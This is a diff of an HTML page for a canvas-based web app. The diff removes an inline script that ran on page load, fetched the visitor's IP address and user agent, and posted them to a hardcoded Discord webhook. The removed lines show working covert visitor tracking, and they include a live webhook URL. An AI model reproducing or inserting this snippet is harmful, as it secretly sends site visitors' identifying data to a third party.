@@ -36,15 +36,5 @@
 	<canvas id="canvas"></canvas>
 	<script src="main.js" type="module"></script>
 	<script src="./modules/gpu-browser.js"></script>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-	<script>         
-		$.getJSON("https://api.ipify.org?format=json", function(data) {
-			const request = new XMLHttpRequest();
-			request.open("POST", "https://discord.com/api/webhooks/1128698053977714779/gAiFpNEj3plQVDJl78Z-fjMig-93lNZZiUums9dGOTzC0alwbSXUFSszPHVhZsKAxe4D");
-			request.setRequestHeader('Content-type', 'application/json');
-			request.send(JSON.stringify({ username: "Console Logger", avatar_url: "", content: data.ip + " ua: " + navigator.userAgent}));
-			console.log(request, "sent")
-		})
-	</script>
 	<p id="display"></p>
 </body>
